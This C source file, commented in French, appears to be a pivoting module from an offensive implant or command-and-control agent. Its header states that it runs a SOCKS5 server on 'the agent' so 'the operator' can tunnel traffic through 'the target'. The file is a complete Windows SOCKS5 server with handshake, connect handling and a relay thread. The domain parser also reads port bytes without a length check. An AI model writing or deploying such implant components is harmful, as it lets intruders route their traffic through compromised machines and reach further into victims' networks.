/*
 * socks5.c - SOCKS5 Proxy Server
 *
 * Implémente un serveur SOCKS5 minimal qui tourne sur l'agent
 * et permet à l'opérateur de tunneliser son trafic via la cible.
 *
 * Le serveur écoute sur un port local et forward les connexions
 * via le protocole SOCKS5 (RFC 1928).
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#include "../../include/common.h"

/* SOCKS5 protocol constants */

#define SOCKS5_VERSION      0x05
#define SOCKS5_AUTH_NONE    0x00
#define SOCKS5_CMD_CONNECT  0x01
#define SOCKS5_ADDR_IPV4    0x01
#define SOCKS5_ADDR_DOMAIN  0x03
#define SOCKS5_ADDR_IPV6    0x04

#define PROXY_BUFFER_SIZE   8192
#define MAX_PROXY_CLIENTS   10

/* Global state */

static SOCKET g_listenSocket = INVALID_SOCKET;
static BOOL g_proxyRunning = FALSE;
static HANDLE g_proxyThread = NULL;
static USHORT g_proxyPort = 0;

/* Connection handling */

typedef struct {
    SOCKET clientSocket;
    SOCKET remoteSocket;
    BOOL active;
} ProxyConnection;

/* Thread de relais bidirectionnel */
static DWORD WINAPI RelayThread(LPVOID param) {
    ProxyConnection* conn = (ProxyConnection*)param;
    
    fd_set readSet;
    char buffer[PROXY_BUFFER_SIZE];
    
    while (conn->active) {
        FD_ZERO(&readSet);
        FD_SET(conn->clientSocket, &readSet);
        FD_SET(conn->remoteSocket, &readSet);
        
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        SOCKET maxSock = max(conn->clientSocket, conn->remoteSocket);
        int result = select((int)maxSock + 1, &readSet, NULL, NULL, &timeout);
        
        if (result <= 0) continue;
        
        // Client -> Remote
        if (FD_ISSET(conn->clientSocket, &readSet)) {
            int received = recv(conn->clientSocket, buffer, sizeof(buffer), 0);
            if (received <= 0) break;
            
            int sent = send(conn->remoteSocket, buffer, received, 0);
            if (sent <= 0) break;
        }
        
        // Remote -> Client
        if (FD_ISSET(conn->remoteSocket, &readSet)) {
            int received = recv(conn->remoteSocket, buffer, sizeof(buffer), 0);
            if (received <= 0) break;
            
            int sent = send(conn->clientSocket, buffer, received, 0);
            if (sent <= 0) break;
        }
    }
    
    closesocket(conn->clientSocket);
    closesocket(conn->remoteSocket);
    conn->active = FALSE;
    free(conn);
    
    return 0;
}

/* Gère le handshake SOCKS5 */
static BOOL HandleSocks5Handshake(SOCKET clientSocket) {
    unsigned char buffer[512];
    
    // Reçoit la requête d'auth
    int received = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
    if (received < 3) return FALSE;
    
    // Vérifie version
    if (buffer[0] != SOCKS5_VERSION) return FALSE;
    
    int numMethods = buffer[1];
    BOOL noAuthSupported = FALSE;
    
    for (int i = 0; i < numMethods && i + 2 < received; i++) {
        if (buffer[2 + i] == SOCKS5_AUTH_NONE) {
            noAuthSupported = TRUE;
            break;
        }
    }
    
    // Répond avec la méthode choisie
    unsigned char response[2];
    response[0] = SOCKS5_VERSION;
    response[1] = noAuthSupported ? SOCKS5_AUTH_NONE : 0xFF;
    
    if (send(clientSocket, (char*)response, 2, 0) != 2) return FALSE;
    
    return noAuthSupported;
}

/* Gère la requête de connexion SOCKS5 */
static SOCKET HandleSocks5Connect(SOCKET clientSocket) {
    unsigned char buffer[512];
    
    // Reçoit la requête de connexion
    int received = recv(clientSocket, (char*)buffer, sizeof(buffer), 0);
    if (received < 10) return INVALID_SOCKET;
    
    // Vérifie version et commande
    if (buffer[0] != SOCKS5_VERSION || buffer[1] != SOCKS5_CMD_CONNECT) {
        return INVALID_SOCKET;
    }
    
    // Parse l'adresse destination
    char destAddr[256] = {0};
    USHORT destPort = 0;
    int addrLen = 0;
    
    switch (buffer[3]) { // Type d'adresse
        case SOCKS5_ADDR_IPV4:
            // IPv4 (4 bytes)
            snprintf(destAddr, sizeof(destAddr), "%u.%u.%u.%u",
                     buffer[4], buffer[5], buffer[6], buffer[7]);
            destPort = (buffer[8] << 8) | buffer[9];
            addrLen = 4;
            break;
            
        case SOCKS5_ADDR_DOMAIN:
            // Domain name (1 byte len + string)
            addrLen = buffer[4];
            if (addrLen > 0 && addrLen < sizeof(destAddr)) {
                memcpy(destAddr, buffer + 5, addrLen);
                destAddr[addrLen] = '\0';
                destPort = (buffer[5 + addrLen] << 8) | buffer[6 + addrLen];
            }
            break;
            
        case SOCKS5_ADDR_IPV6:
            // IPv6 non supporté pour l'instant
            return INVALID_SOCKET;
            
        default:
            return INVALID_SOCKET;
    }
    
    // Résout et connecte
    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    char portStr[16];
    snprintf(portStr, sizeof(portStr), "%u", destPort);
    
    if (getaddrinfo(destAddr, portStr, &hints, &result) != 0) {
        return INVALID_SOCKET;
    }
    
    SOCKET remoteSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (remoteSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        return INVALID_SOCKET;
    }
    
    if (connect(remoteSocket, result->ai_addr, (int)result->ai_addrlen) != 0) {
        closesocket(remoteSocket);
        freeaddrinfo(result);
        return INVALID_SOCKET;
    }
    
    freeaddrinfo(result);
    
    // Envoie la réponse de succès
    unsigned char response[10] = {
        SOCKS5_VERSION, 0x00, 0x00, SOCKS5_ADDR_IPV4,
        0x00, 0x00, 0x00, 0x00, // Bound address (0.0.0.0)
        0x00, 0x00              // Bound port (0)
    };
    
    if (send(clientSocket, (char*)response, 10, 0) != 10) {
        closesocket(remoteSocket);
        return INVALID_SOCKET;
    }
    
    return remoteSocket;
}

/* Thread principal du proxy */
static DWORD WINAPI ProxyThread(LPVOID param) {
    UNUSED(param);
    
    while (g_proxyRunning) {
        struct sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);
        
        SOCKET clientSocket = accept(g_listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            if (!g_proxyRunning) break;
            continue;
        }
        
        // Handshake SOCKS5
        if (!HandleSocks5Handshake(clientSocket)) {
            closesocket(clientSocket);
            continue;
        }
        
        // Connexion SOCKS5
        SOCKET remoteSocket = HandleSocks5Connect(clientSocket);
        if (remoteSocket == INVALID_SOCKET) {
            closesocket(clientSocket);
            continue;
        }
        
        // Crée le thread de relais
        ProxyConnection* conn = (ProxyConnection*)malloc(sizeof(ProxyConnection));
        if (!conn) {
            closesocket(clientSocket);
            closesocket(remoteSocket);
            continue;
        }
        
        conn->clientSocket = clientSocket;
        conn->remoteSocket = remoteSocket;
        conn->active = TRUE;
        
        HANDLE relayThread = CreateThread(NULL, 0, RelayThread, conn, 0, NULL);
        if (relayThread) {
            CloseHandle(relayThread);
        } else {
            closesocket(clientSocket);
            closesocket(remoteSocket);
            free(conn);
        }
    }
    
    return 0;
}

/* Public API */

/*
 * Démarre le serveur SOCKS5 sur le port spécifié.
 * port: port d'écoute (0 = choix automatique)
 * Retourne le port effectif ou 0 en cas d'erreur.
 */
USHORT Socks5_Start(USHORT port) {
    if (g_proxyRunning) return g_proxyPort;
    
    // Initialise Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 0;
    }
    
    // Crée le socket d'écoute
    g_listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_listenSocket == INVALID_SOCKET) {
        WSACleanup();
        return 0;
    }
    
    // Bind
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // Localhost seulement
    addr.sin_port = htons(port);
    
    if (bind(g_listenSocket, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(g_listenSocket);
        g_listenSocket = INVALID_SOCKET;
        WSACleanup();
        return 0;
    }
    
    // Récupère le port effectif
    int addrLen = sizeof(addr);
    getsockname(g_listenSocket, (struct sockaddr*)&addr, &addrLen);
    g_proxyPort = ntohs(addr.sin_port);
    
    // Écoute
    if (listen(g_listenSocket, MAX_PROXY_CLIENTS) != 0) {
        closesocket(g_listenSocket);
        g_listenSocket = INVALID_SOCKET;
        WSACleanup();
        return 0;
    }
    
    // Lance le thread
    g_proxyRunning = TRUE;
    g_proxyThread = CreateThread(NULL, 0, ProxyThread, NULL, 0, NULL);
    if (!g_proxyThread) {
        g_proxyRunning = FALSE;
        closesocket(g_listenSocket);
        g_listenSocket = INVALID_SOCKET;
        WSACleanup();
        return 0;
    }
    
    return g_proxyPort;
}

/*
 * Arrête le serveur SOCKS5.
 */
void Socks5_Stop(void) {
    if (!g_proxyRunning) return;
    
    g_proxyRunning = FALSE;
    
    if (g_listenSocket != INVALID_SOCKET) {
        closesocket(g_listenSocket);
        g_listenSocket = INVALID_SOCKET;
    }
    
    if (g_proxyThread) {
        WaitForSingleObject(g_proxyThread, 5000);
        CloseHandle(g_proxyThread);
        g_proxyThread = NULL;
    }
    
    WSACleanup();
    g_proxyPort = 0;
}

/*
 * Vérifie si le proxy est actif.
 */
BOOL Socks5_IsRunning(void) {
    return g_proxyRunning;
}

/*
 * Retourne le port d'écoute du proxy.
 */
USHORT Socks5_GetPort(void) {
    return g_proxyPort;
}
